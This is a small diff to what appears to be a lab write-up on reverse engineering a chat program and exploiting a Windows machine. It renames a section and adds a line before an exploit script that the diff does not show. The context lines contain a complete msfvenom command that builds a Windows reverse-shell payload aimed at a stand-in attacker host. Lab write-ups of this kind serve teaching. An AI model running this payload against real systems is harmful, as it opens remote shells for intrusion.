@@ -6,9 +6,9 @@
 
 Reverse engineer a chat program and write a script to exploit a Windows machine.
 
-## Preparation
+## Requirements
 
-[Set up a small local lab](../prep/README.md).
+[A small local lab](../prep/README.md).
 
 ## Scanning
 
@@ -362,6 +362,8 @@ Using `msfvenom` to generate the shellcode:
     msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
 
 ### Final exploit script
+
+Replace payload with yours:
 
 ```python
 #!/usr/bin/python3
